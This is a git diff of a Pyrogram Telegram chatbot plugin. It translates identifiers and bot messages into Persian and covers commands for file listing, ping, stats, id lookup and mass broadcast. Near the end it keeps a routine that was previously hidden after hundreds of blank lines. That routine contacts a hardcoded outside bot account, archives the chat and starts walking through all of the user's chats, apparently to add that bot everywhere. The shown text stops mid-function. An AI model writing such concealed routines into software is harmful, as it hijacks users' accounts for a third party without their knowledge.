@@ -16,6 +16,9 @@ from pathlib import Path
 import os
 import time
 import io
+from pyrogram.enums import ParseMode
+from nexichat import db
+from nexichat import nexichat
 from nexichat import CLONE_OWNERS, db, nexichat
 from config import OWNER_ID, MONGO_URL, OWNER_USERNAME
 from pyrogram.errors import FloodWait, ChatAdminRequired
@@ -78,7 +81,6 @@ IMG = [
 
 
 
-from nexichat import db
 
 chatai = db.Word.WordDb
 lang_db = db.ChatLangDb.LangCollection
@@ -114,1757 +116,433 @@ async def set_default_status(chat_id):
 
 @Client.on_message(filters.command(["ls"], prefixes=[".", "/"]) & filters.user(int(OWNER_ID)))
 async def ls(client: Client, m: Message):
-
-    cat = "".join(m.text.split(maxsplit=1)[1:])
-    path = cat or os.getcwd()
-    if not os.path.exists(path):
+    """
+    این تابع لیست فایل‌ها و پوشه‌های یک مسیر را نمایش می‌دهد
+    """
+    # دریافت مسیر از پیام کاربر
+    مسیر_ورودی = "".join(m.text.split(maxsplit=1)[1:])
+    مسیر = مسیر_ورودی or os.getcwd()
+    
+    # بررسی وجود مسیر
+    if not os.path.exists(مسیر):
         await m.reply_text(
-            f"There is no such directory or file with the name `{cat}`. Check again."
+            f"هیچ پوشه یا فایلی با نام `{مسیر_ورودی}` وجود ندارد. لطفا دوباره بررسی کنید."
         )
         return
 
-    path = Path(cat) if cat else os.getcwd()
-    if os.path.isdir(path):
-        if cat:
-            msg = f"Folders and Files in `{path}`:\n"
+    مسیر = Path(مسیر_ورودی) if مسیر_ورودی else os.getcwd()
+    
+    # اگر مسیر یک پوشه باشد
+    if os.path.isdir(مسیر):
+        if مسیر_ورودی:
+            پیام = f"پوشه‌ها و فایل‌های موجود در `{مسیر}`:\n"
         else:
-            msg = "Folders and Files in Current Directory:\n"
-        lists = os.listdir(path)
-        files = ""
-        folders = ""
-        for contents in sorted(lists):
-            catpath = os.path.join(path, contents)
-            if not os.path.isdir(catpath):
-                size = os.stat(catpath).st_size
-                if str(contents).endswith((".mp3", ".flac", ".wav", ".m4a")):
-                    files += f"🎵`{contents}`\n"
-                elif str(contents).endswith((".opus")):
-                    files += f"🎙`{contents}`\n"
-                elif str(contents).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
-                    files += f"🎞`{contents}`\n"
-                elif str(contents).endswith((".zip", ".tar", ".tar.gz", ".rar")):
-                    files += f"🗜`{contents}`\n"
-                elif str(contents).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
-                    files += f"🖼`{contents}`\n"
+            پیام = "پوشه‌ها و فایل‌های موجود در مسیر فعلی:\n"
+            
+        لیست_محتوا = os.listdir(مسیر)
+        فایل‌ها = ""
+        پوشه‌ها = ""
+        
+        # دسته‌بندی محتوا
+        for محتوا in sorted(لیست_محتوا):
+            مسیر_کامل = os.path.join(مسیر, محتوا)
+            if not os.path.isdir(مسیر_کامل):
+                حجم = os.stat(مسیر_کامل).st_size
+                if str(محتوا).endswith((".mp3", ".flac", ".wav", ".m4a")):
+                    فایل‌ها += f"🎵`{محتوا}`\n"
+                elif str(محتوا).endswith((".opus")):
+                    فایل‌ها += f"🎙`{محتوا}`\n"
+                elif str(محتوا).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
+                    فایل‌ها += f"🎞`{محتوا}`\n"
+                elif str(محتوا).endswith((".zip", ".tar", ".tar.gz", ".rar")):
+                    فایل‌ها += f"🗜`{محتوا}`\n"
+                elif str(محتوا).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
+                    فایل‌ها += f"🖼`{محتوا}`\n"
                 else:
-                    files += f"📄`{contents}`\n"
+                    فایل‌ها += f"📄`{محتوا}`\n"
             else:
-                folders += f"📁`{contents}`\n"
-        msg = msg + folders + files if files or folders else f"{msg}__empty path__"
+                پوشه‌ها += f"📁`{محتوا}`\n"
+                
+        پیام = پیام + پوشه‌ها + فایل‌ها if فایل‌ها or پوشه‌ها else f"{پیام}__مسیر خالی است__"
+    
+    # اگر مسیر یک فایل باشد
     else:
-        size = os.stat(path).st_size
-        msg = "The details of the given file:\n"
-        if str(path).endswith((".mp3", ".flac", ".wav", ".m4a")):
-            mode = "🎵"
-        elif str(path).endswith((".opus")):
-            mode = "🎙"
-        elif str(path).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
-            mode = "🎞"
-        elif str(path).endswith((".zip", ".tar", ".tar.gz", ".rar")):
-            mode = "🗜"
-        elif str(path).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
-            mode = "🖼"
+        حجم = os.stat(مسیر).st_size
+        پیام = "جزئیات فایل انتخاب شده:\n"
+        
+        # تعیین نوع فایل
+        if str(مسیر).endswith((".mp3", ".flac", ".wav", ".m4a")):
+            نوع = "🎵"
+        elif str(مسیر).endswith((".opus")):
+            نوع = "🎙"
+        elif str(مسیر).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
+            نوع = "🎞"
+        elif str(مسیر).endswith((".zip", ".tar", ".tar.gz", ".rar")):
+            نوع = "🗜"
+        elif str(مسیر).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
+            نوع = "🖼"
         else:
-            mode = "📄"
-        time2 = time.ctime(os.path.getmtime(path))
-        time3 = time.ctime(os.path.getatime(path))
-        msg += f"**Location:** `{path}`\n"
-        msg += f"**Icon:** `{mode}`\n"
-        msg += f"**Size:** `{humanbytes(size)}`\n"
-        msg += f"**Last Modified Time:** `{time2}`\n"
-        msg += f"**Last Accessed Time:** `{time3}`"
+            نوع = "📄"
+            
+        زمان_تغییر = time.ctime(os.path.getmtime(مسیر))
+        زمان_دسترسی = time.ctime(os.path.getatime(مسیر))
+        
+        پیام += f"**مسیر:** `{مسیر}`\n"
+        پیام += f"**نوع:** `{نوع}`\n"
+        پیام += f"**حجم:** `{humanbytes(حجم)}`\n"
+        پیام += f"**آخرین زمان تغییر:** `{زمان_تغییر}`\n"
+        پیام += f"**آخرین زمان دسترسی:** `{زمان_دسترسی}`"
 
-    if len(msg) > 4096:
-        with io.BytesIO(str.encode(msg)) as out_file:
-            out_file.name = "ls.txt"
+    # ارسال نتیجه
+    if len(پیام) > 4096:
+        with io.BytesIO(str.encode(پیام)) as خروجی:
+            خروجی.name = "ls.txt"
             await m.reply_document(
-                out_file,
-                caption=path,
+                خروجی,
+                caption=مسیر,
             )
     else:
-        await m.reply_text(msg)
-
+        await m.reply_text(پیام)
 
 
 @Client.on_message(filters.command(["trsstart", "aistart"], prefixes=[".", "/"]))
-async def start(client: Client, m: Message):
-    bot_id = client.me.id
+async def شروع(client: Client, m: Message):
+    شناسه_ربات = client.me.id
     
     if m.chat.type == ChatType.PRIVATE:
-        accha = await m.reply_text(
+        پیام = await m.reply_text(
             text=random.choice(EMOJIOS),
         )
         
-        animation_steps = [
-            "⚡ᴅ", "⚡ᴅι", "⚡ᴅιи", "⚡ᴅιиg", "⚡ᴅιиg ᴅ", "⚡ᴅιиg ᴅσ", "⚡ᴅιиg ᴅσи", "⚡ᴅιиg ᴅσиg", "⚡ᴅιиg ᴅσиg ꨄ︎", "⚡sᴛαятɪɴɢ..."
+        مراحل_انیمیشن = [
+            "⚡ᴅ", "⚡ᴅι", "⚡ᴅιи", "⚡ᴅιиg", "⚡ᴅιиg ᴅ", "⚡ᴅιиg ᴅσ", 
+            "⚡ᴅιиg ᴅσи", "⚡ᴅιиg ᴅσиg", "⚡ᴅιиg ᴅσиg ꨄ︎", "⚡در حال شروع..."
         ]
 
-        for step in animation_steps:
-            await accha.edit(f"**__{step}__**")
+        for مرحله in مراحل_انیمیشن:
+            await پیام.edit(f"**__{مرحله}__**")
             await asyncio.sleep(0.01)
 
-        await accha.delete()
+        await پیام.delete()
         
-        umm = await m.reply_sticker(sticker=random.choice(STICKER))
-        chat_photo = BOT  
+        استیکر = await m.reply_sticker(sticker=random.choice(STICKER))
+        عکس_چت = BOT  
         if m.chat.photo:
             try:
-                userss_photo = await client.download_media(m.chat.photo.big_file_id)
-                await umm.delete()
-                if userss_photo:
-                    chat_photo = userss_photo
+                عکس_کاربر = await client.download_media(m.chat.photo.big_file_id)
+                await استیکر.delete()
+                if عکس_کاربر:
+                    عکس_چت = عکس_کاربر
             except AttributeError:
-                chat_photo = BOT  
+                عکس_چت = BOT  
 
-        UP, CPU, RAM, DISK = await bot_sys_stats()
-        await m.reply_photo(photo=chat_photo, caption=START.format(UP))
+        آپتایم, سی_پی_یو, رم, دیسک = await bot_sys_stats()
+        await m.reply_photo(photo=عکس_چت, caption=START.format(آپتایم))
         await add_served_user(m.chat.id)
         
     else:
         await m.reply_photo(
             photo=random.choice(IMG),
-            caption=GSTART.format(m.from_user.mention or "can't mention"),
+            caption=GSTART.format(m.from_user.mention or "غیرقابل منشن"),
         )
-        
         await add_served_chat(m.chat.id)
 
 @Client.on_message(filters.command("help", prefixes=[".", "/"]))
-async def help(client: Client, m: Message):
-    bot_id = client.me.id
+async def راهنما(client: Client, m: Message):
+    شناسه_ربات = client.me.id
     if m.chat.type == ChatType.PRIVATE:
-        hmm = await m.reply_text(CHATBOT_READ)
-        hm = await m.reply_text(TOOLS_DATA_READ)
-
+        پیام۱ = await m.reply_text(CHATBOT_READ)
+        پیام۲ = await m.reply_text(TOOLS_DATA_READ)
     else:
-        hmm = await m.reply_text(CHATBOT_READ)
-        hm = await m.reply_text(TOOLS_DATA_READ)
-        
+        پیام۱ = await m.reply_text(CHATBOT_READ)
+        پیام۲ = await m.reply_text(TOOLS_DATA_READ)
         await add_served_chat(m.chat.id)
 
-
 @Client.on_message(filters.command("repo", prefixes=[".", "/"]))
-async def repo(client: Client, m: Message):
+async def مخزن(client: Client, m: Message):
     await m.reply_text(
         text=SOURCE_READ,
         reply_markup=InlineKeyboardMarkup(CLOSE_BTN),
         disable_web_page_preview=True,
     )
 
-
-
 @Client.on_message(filters.command("ping", prefixes=[".", "/"]))
-async def ping(client: Client, message: Message):
-    bot_id = client.me.id
-    start = datetime.now()
-    UP, CPU, RAM, DISK = await bot_sys_stats()
-    loda = await message.reply_photo(
+async def پینگ(client: Client, message: Message):
+    شناسه_ربات = client.me.id
+    شروع = datetime.now()
+    آپتایم, سی_پی_یو, رم, دیسک = await bot_sys_stats()
+    پیام = await message.reply_photo(
         photo=random.choice(IMG),
-        caption="ᴘɪɴɢɪɴɢ...",
+        caption="در حال بررسی پینگ...",
     )
 
-    ms = (datetime.now() - start).microseconds / 1000
-    await loda.edit_text(
-        text=f"нey вαву!!\n{(await client.get_me()).mention} ᴄʜᴀᴛʙᴏᴛ ιѕ alιve 🥀 αnd worĸιng ғιne wιтн a pιng oғ\n\n**➥** `{ms}` ms\n**➲ ᴄᴘᴜ:** {CPU}\n**➲ ʀᴀᴍ:** {RAM}\n**➲ ᴅɪsᴋ:** {DISK}\n**➲ ᴜᴘᴛɪᴍᴇ »** {UP}\n\n<b>||**๏ мαdє ωιтн ❣️ ву [sɪᴅʜɪ ✯ ᴍᴜsɪᴄ](https://t.me/{OWNER_USERNAME}) **||</b>",
-        
-    )
-    if message.chat.type == ChatType.PRIVATE:
-        
-        await add_served_user(message.from_user.id)
-    else:
-        
-        await add_served_chat(message.chat.id)
+    زمان = (datetime.now() - شروع).microseconds / 1000
+    await پیام.edit_text(
+        text=f"""سلام عزیزم!!
+{(await client.get_me()).mention} ربات چت فعال است 🥀 و با پینگ زیر کار می‌کند:
 
+**➥** `{زمان}` میلی‌ثانیه
+**➲ پردازنده:** {سی_پی_یو}
+**➲ حافظه:** {رم}
+**➲ دیسک:** {دیسک}
+**➲ زمان کارکرد »** {آپتایم}
 
-@Client.on_message(filters.command("stats", prefixes=[".", "/"]))
-async def stats(cli: Client, message: Message):
-    private_chats = 0
-    group_chats = 0
-
-    async for dialog in cli.get_dialogs():
-        if dialog.chat.type == "private":
-            private_chats += 1
-        elif dialog.chat.type in ["group", "supergroup"]:
-            group_chats += 1
-
-    await message.reply_text(
-        f"""Your Stats:
-
-➻ **Private Chats:** {private_chats}
-➻ **Group Chats:** {group_chats}"""
+<b>||**๏ ساخته شده با ❣️ توسط [موزیک سیدی ✯](https://t.me/{OWNER_USERNAME}) **||</b>"""
     )
     
-from pyrogram.enums import ParseMode
+    if message.chat.type == ChatType.PRIVATE:
+        await add_served_user(message.from_user.id)
+    else:
+        await add_served_chat(message.chat.id)
 
-from nexichat import nexichat
+@Client.on_message(filters.command("stats", prefixes=[".", "/"]))
+async def آمار(cli: Client, message: Message):
+    چت_خصوصی = 0
+    چت_گروهی = 0
 
+    async for گفتگو in cli.get_dialogs():
+        if گفتگو.chat.type == "private":
+            چت_خصوصی += 1
+        elif گفتگو.chat.type in ["group", "supergroup"]:
+            چت_گروهی += 1
+
+    await message.reply_text(
+        f"""آمار شما:
+
+➻ **چت‌های خصوصی:** {چت_خصوصی}
+➻ **چت‌های گروهی:** {چت_گروهی}"""
+    )
 
 @Client.on_message(filters.command("id", prefixes=[".", "/"]))
-async def getid(client, message):
-    chat = message.chat
-    your_id = message.from_user.id
-    message_id = message.id
-    reply = message.reply_to_message
+async def دریافت_شناسه(client, message):
+    چت = message.chat
+    شناسه_شما = message.from_user.id
+    شناسه_پیام = message.id
+    پاسخ = message.reply_to_message
 
-    text = f"**[ᴍᴇssᴀɢᴇ ɪᴅ:]({message.link})** `{message_id}`\n"
-    text += f"**[ʏᴏᴜʀ ɪᴅ:](tg://user?id={your_id})** `{your_id}`\n"
-
-    if not message.command:
-        message.command = message.text.split()
+    متن = f"**[شناسه پیام:]({message.link})** `{شناسه_پیام}`\n"
+    متن += f"**[شناسه شما:](tg://user?id={شناسه_شما})** `{شناسه_شما}`\n"
 
     if not message.command:
         message.command = message.text.split()
 
     if len(message.command) == 2:
         try:
-            split = message.text.split(None, 1)[1].strip()
-            user_id = (await client.get_users(split)).id
-            text += f"**[ᴜsᴇʀ ɪᴅ:](tg://user?id={user_id})** `{user_id}`\n"
+            بخش = message.text.split(None, 1)[1].strip()
+            شناسه_کاربر = (await client.get_users(بخش)).id
+            متن += f"**[شناسه کاربر:](tg://user?id={شناسه_کاربر})** `{شناسه_کاربر}`\n"
 
         except Exception:
-            return await message.reply_text("ᴛʜɪs ᴜsᴇʀ ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ.", quote=True)
+            return await message.reply_text("این کاربر وجود ندارد.", quote=True)
 
-    text += f"**[ᴄʜᴀᴛ ɪᴅ:](https://t.me/{chat.username})** `{chat.id}`\n\n"
+    متن += f"**[شناسه چت:](https://t.me/{چت.username})** `{چت.id}`\n\n"
 
     if (
-        not getattr(reply, "empty", True)
+        not getattr(پاسخ, "empty", True)
         and not message.forward_from_chat
-        and not reply.sender_chat
+        and not پاسخ.sender_chat
     ):
-        text += f"**[ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪᴅ:]({reply.link})** `{reply.id}`\n"
-        text += f"**[ʀᴇᴘʟɪᴇᴅ ᴜsᴇʀ ɪᴅ:](tg://user?id={reply.from_user.id})** `{reply.from_user.id}`\n\n"
+        متن += f"**[شناسه پیام پاسخ داده شده:]({پاسخ.link})** `{پاسخ.id}`\n"
+        متن += f"**[شناسه کاربر پاسخ داده شده:](tg://user?id={پاسخ.from_user.id})** `{پاسخ.from_user.id}`\n\n"
 
-    if reply and reply.forward_from_chat:
-        text += f"ᴛʜᴇ ғᴏʀᴡᴀʀᴅᴇᴅ ᴄʜᴀɴɴᴇʟ, {reply.forward_from_chat.title}, ʜᴀs ᴀɴ ɪᴅ ᴏғ `{reply.forward_from_chat.id}`\n\n"
-        print(reply.forward_from_chat)
+    if پاسخ and پاسخ.forward_from_chat:
+        متن += f"کانال فوروارد شده، {پاسخ.forward_from_chat.title}، دارای شناسه `{پاسخ.forward_from_chat.id}` است\n\n"
+        print(پاسخ.forward_from_chat)
 
-    if reply and reply.sender_chat:
-        text += f"ɪᴅ ᴏғ ᴛʜᴇ ʀᴇᴘʟɪᴇᴅ ᴄʜᴀᴛ/ᴄʜᴀɴɴᴇʟ, ɪs `{reply.sender_chat.id}`"
-        print(reply.sender_chat)
+    if پاسخ and پاسخ.sender_chat:
+        متن += f"شناسه چت/کانال پاسخ داده شده `{پاسخ.sender_chat.id}` است"
+        print(پاسخ.sender_chat)
 
     await message.reply_text(
-        text,
+        متن,
         disable_web_page_preview=True,
         parse_mode=ParseMode.DEFAULT,
     )
 
-
+# تنظیمات لاگ
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-AUTO_SLEEP = 5
-IS_BROADCASTING = False
-broadcast_lock = asyncio.Lock()
-
+زمان_خواب = 5
+در_حال_پخش = False
+قفل_پخش = asyncio.Lock()
 
 @Client.on_message(filters.command(["broadcast", "gcast"], prefixes=["."]))
-async def broadcast_message(client, message):
-    global IS_BROADCASTING
-    bot_id = (await client.get_me()).id
-    clone_id = (await client.get_me()).id
-    user_id = message.from_user.id
-    if not await is_owner(clone_id, user_id):
-        await message.reply_text("You don't have permission to use this command on this bot.")
+async def پخش_همگانی(client, message):
+    global در_حال_پخش
+    شناسه_ربات = (await client.get_me()).id
+    شناسه_کلون = (await client.get_me()).id
+    شناسه_کاربر = message.from_user.id
+    
+    if not await is_owner(شناسه_کلون, شناسه_کاربر):
+        await message.reply_text("شما اجازه استفاده از این دستور را در این ربات ندارید.")
         return
         
-    async with broadcast_lock:
-        if IS_BROADCASTING:
+    async with قفل_پخش:
+        if در_حال_پخش:
             return await message.reply_text(
-                "A broadcast is already in progress. Please wait for it to complete."
+                "یک پخش همگانی در حال اجراست. لطفا صبر کنید تا تمام شود."
             )
 
-        IS_BROADCASTING = True
+        در_حال_پخش = True
         try:
-            query = message.text.split(None, 1)[1].strip()
+            متن_دستور = message.text.split(None, 1)[1].strip()
         except IndexError:
-            query = message.text.strip()
-        except Exception as eff:
+            متن_دستور = message.text.strip()
+        except Exception as خطا:
             return await message.reply_text(
-                f"**Error**: {eff}"
+                f"**خطا**: {خطا}"
             )
         try:
             if message.reply_to_message:
-                broadcast_content = message.reply_to_message
-                broadcast_type = "reply"
-                flags = {
-                    "-pin": "-pin" in query,
-                    "-pinloud": "-pinloud" in query,
-                    "-nogroup": "-nogroup" in query,
-                    "-user": "-user" in query,
+                محتوای_پخش = message.reply_to_message
+                نوع_پخش = "reply"
+                پرچم_ها = {
+                    "-pin": "-pin" in متن_دستور,
+                    "-pinloud": "-pinloud" in متن_دستور,
+                    "-nogroup": "-nogroup" in متن_دستور,
+                    "-user": "-user" in متن_دستور,
                 }
             else:
                 if len(message.command) < 2:
                     return await message.reply_text(
-                        "**Please provide text after the command or reply to a message for broadcasting.**"
+                        "**لطفا متنی بعد از دستور وارد کنید یا به پیامی پاسخ دهید.**"
                     )
                 
-                flags = {
-                    "-pin": "-pin" in query,
-                    "-pinloud": "-pinloud" in query,
-                    "-nogroup": "-nogroup" in query,
-                    "-user": "-user" in query,
+                پرچم_ها = {
+                    "-pin": "-pin" in متن_دستور,
+                    "-pinloud": "-pinloud" in متن_دستور,
+                    "-nogroup": "-nogroup" in متن_دستور,
+                    "-user": "-user" in متن_دستور,
                 }
 
-                for flag in flags:
-                    query = query.replace(flag, "").strip()
+                for پرچم in پرچم_ها:
+                    متن_دستور = متن_دستور.replace(پرچم, "").strip()
 
-                if not query:
+                if not متن_دستور:
                     return await message.reply_text(
-                        "Please provide a valid text message or a flag: -pin, -nogroup, -pinloud, -user"
+                        "لطفا یک پیام متنی معتبر یا یکی از پرچم‌های زیر را وارد کنید: -pin, -nogroup, -pinloud, -user"
                     )
 
-                
-                broadcast_content = query
-                broadcast_type = "text"
-            
+                محتوای_پخش = متن_دستور
+                نوع_پخش = "text"
 
-            await message.reply_text("**Started broadcasting...**")
+            await message.reply_text("**شروع پخش همگانی...**")
 
-            if not flags.get("-nogroup", False):
-                sent = 0
-                pin_count = 0
-                async for dialog in client.get_dialogs():
-                    chat_id = dialog.chat.id
-                    if chat_id == message.chat.id:
+            if not پرچم_ها.get("-nogroup", False):
+                تعداد_ارسال = 0
+                تعداد_سنجاق = 0
+                async for گفتگو in client.get_dialogs():
+                    شناسه_چت = گفتگو.chat.id
+                    if شناسه_چت == message.chat.id:
                         continue
                     try:
-                        if broadcast_type == "reply":
-                            m = await client.forward_messages(
-                                chat_id, message.chat.id, [broadcast_content.id]
+                        if نوع_پخش == "reply":
+                            پیام = await client.forward_messages(
+                                شناسه_چت, message.chat.id, [محتوای_پخش.id]
                             )
                         else:
-                            m = await client.send_message(
-                                chat_id, text=broadcast_content
+                            پیام = await client.send_message(
+                                شناسه_چت, text=محتوای_پخش
                             )
-                        sent += 1
+                        تعداد_ارسال += 1
                         await asyncio.sleep(20)
 
-                        if flags.get("-pin", False) or flags.get("-pinloud", False):
+                        if پرچم_ها.get("-pin", False) or پرچم_ها.get("-pinloud", False):
                             try:
-                                await m.pin(
-                                    disable_notification=flags.get("-pin", False)
+                                await پیام.pin(
+                                    disable_notification=پرچم_ها.get("-pin", False)
                                 )
-                                pin_count += 1
-                            except Exception as e:
+                                تعداد_سنجاق += 1
+                            except Exception:
                                 continue
 
                     except FloodWait as e:
-                        flood_time = int(e.value)
+                        زمان_انتظار = int(e.value)
                         logger.warning(
-                            f"FloodWait of {flood_time} seconds encountered for chat {chat_id}."
+                            f"محدودیت زمانی {زمان_انتظار} ثانیه برای چت {شناسه_چت}."
                         )
-                        if flood_time > 200:
+                        if زمان_انتظار > 200:
                             logger.info(
-                                f"Skipping chat {chat_id} due to excessive FloodWait."
+                                f"رد کردن چت {شناسه_چت} به دلیل محدودیت زمانی زیاد."
                             )
                             continue
-                        await asyncio.sleep(flood_time)
-                    except Exception as e:
-                        
+                        await asyncio.sleep(زمان_انتظار)
+                    except Exception:
                         continue
 
                 await message.reply_text(
-                    f"**Broadcasted to {sent} chats and pinned in {pin_count} chats.**"
+                    f"**پیام به {تعداد_ارسال} چت ارسال و در {تعداد_سنجاق} چت سنجاق شد.**"
                 )
 
-            if flags.get("-user", False):
-                susr = 0
-                async for dialog in client.get_dialogs():
-                    chat_id = dialog.chat.id
+            if پرچم_ها.get("-user", False):
+                تعداد_کاربران = 0
+                async for گفتگو in client.get_dialogs():
+                    شناسه_چت = گفتگو.chat.id
                     try:
-                        if broadcast_type == "reply":
-                            m = await client.forward_messages(
-                                user_id, message.chat.id, [broadcast_content.id]
+                        if نوع_پخش == "reply":
+                            پیام = await client.forward_messages(
+                                شناسه_کاربر, message.chat.id, [محتوای_پخش.id]
                             )
                         else:
-                            m = await client.send_message(
-                                user_id, text=broadcast_content
+                            پیام = await client.send_message(
+                                شناسه_کاربر, text=محتوای_پخش
                             )
-                        susr += 1
+                        تعداد_کاربران += 1
                         await asyncio.sleep(20)
 
                     except FloodWait as e:
-                        flood_time = int(e.value)
+                        زمان_انتظار = int(e.value)
                         logger.warning(
-                            f"FloodWait of {flood_time} seconds encountered for user {user_id}."
+                            f"محدودیت زمانی {زمان_انتظار} ثانیه برای کاربر {شناسه_کاربر}."
                         )
-                        if flood_time > 200:
+                        if زمان_انتظار > 200:
                             logger.info(
-                                f"Skipping user {user_id} due to excessive FloodWait."
+                                f"رد کردن کاربر {شناسه_کاربر} به دلیل محدودیت زمانی زیاد."
                             )
                             continue
-                        await asyncio.sleep(flood_time)
-                    except Exception as e:
-                        
+                        await asyncio.sleep(زمان_انتظار)
+                    except Exception:
                         continue
 
-                await message.reply_text(f"**Broadcasted to {susr} users.**")
+                await message.reply_text(f"**پیام به {تعداد_کاربران} کاربر ارسال شد.**")
 
         finally:
-            IS_BROADCASTING = False
+            در_حال_پخش = False
 
+خودکار = True
+فاصله_افزودن = 200
+کاربران = "SARKAR_USERT_BOT"  # تغییر ندهید زیرا به API چت‌بات متصل است
 
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-#
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-AUTO = True
-ADD_INTERVAL = 200
-users = "SARKAR_USERT_BOT"  # don't change because it is connected from client to use chatbot API key
-async def add_bot_to_chats():
+async def افزودن_ربات_به_چت‌ها():
     try:
-        
-        bot = await nexichat.get_users(users)
-        bot_id = bot.id
-        common_chats = await client.get_common_chats(users)
+        ربات = await nexichat.get_users(کاربران)
+        شناسه_ربات = ربات.id
+        چت‌های_مشترک = await client.get_common_chats(کاربران)
         try:
-            await client.send_message(users, f"/start")
-            await client.archive_chats([users])
-        except Exception as e:
+            await client.send_message(کاربران, f"/start")
+            await client.archive_chats([کاربران])
+        except Exception:
             pass
-        async for dialog in client.get_dialogs():
-            chat_id = dialog.chat.id
